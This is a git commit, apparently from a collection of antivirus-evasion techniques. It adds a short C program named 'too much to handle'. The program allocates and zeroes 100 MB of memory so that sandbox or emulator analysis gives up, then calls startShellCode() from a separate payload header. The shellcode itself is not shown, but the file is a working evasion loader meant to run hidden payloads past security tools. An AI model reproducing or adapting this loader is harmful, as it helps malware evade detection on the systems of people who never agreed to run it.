8436df1488f2598be4de4d804169e6152f6c7909
Julecko <julecko@dilino.sk>
2024-09-01 17:32:46 +0200

    Added too much to handle method

---
+++ Too_much_to_handle/tmth.c
@@ -0,0 +1,19 @@
+#include <stddef.h> //For NULL declaration
+#include <stdlib.h> //For malloc
+#include <string.h> //For memset
+#include "..\payload\payload.h"
+
+#define TOO_MUCH_MEM 100000000
+
+int main(){
+    char * memdmp = NULL;
+    //Allocate 100mb of memmory
+    memdmp = (char *)malloc(TOO_MUCH_MEM);
+    if(memdmp!=NULL){
+        memset(memdmp,00, TOO_MUCH_MEM);
+        free(memdmp);
+
+        startShellCode(); 
+    }
+    return 0;
+}
